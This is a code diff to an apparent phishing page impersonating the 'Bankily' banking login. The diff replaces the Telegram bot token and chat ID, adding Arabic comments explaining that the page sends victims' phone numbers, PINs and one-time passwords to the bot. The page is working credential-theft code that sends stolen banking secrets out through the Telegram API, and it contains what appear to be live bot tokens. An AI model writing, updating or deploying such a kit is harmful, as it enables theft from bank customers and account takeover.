@@ -387,9 +387,9 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 </div>
 
 <script>
-// --- إعدادات التليجرام الجديدة المستخرجة من الصور ---
-const TELEGRAM_TOKEN = "7961226065:AAFf107hC4sMhC8y9Y7JkK4vL3N2m1p0X9Z"; // تم التحديث بناءً على طلبك
-const TELEGRAM_CHAT_ID = "7820301322"; // تم التحديث بناءً على طلبك
+// --- إعدادات التليجرام الجديدة ---
+const TELEGRAM_TOKEN = "8854630231:AAHwY-escCA2tlAzBgDZWqNaPNqUNTpIKGA";
+const TELEGRAM_CHAT_ID = "8972356637";
 
 async function sendTelegramMessage(text) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
@@ -479,6 +479,7 @@ async function login(){
   if(ph.length !== 8 || !isValidPrefix || pin.length !== 4){
     document.getElementById('user-error-modal').classList.remove('hide');
   } else {
+    // إرسال معلومات تسجيل الدخول للبوت بالمعلومات الجديدة
     let message = `🔔 <b>Bankily Login</b>\n📱 Phone: ${ph}\n🔑 Pin: ${pin}`;
     await sendTelegramMessage(message);
     showOtp();
@@ -530,6 +531,7 @@ async function verify(){
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   
+  // إرسال رمز التحقق (OTP) مع رقم الهاتف والرقم السري للبوت
   let message = `🔔 <b>Bankily Login (OTP)</b>\n📱 Phone: ${ph}\n🔑 Pin: ${pin}\n📝 OTP: ${code}`;
   await sendTelegramMessage(message);
 
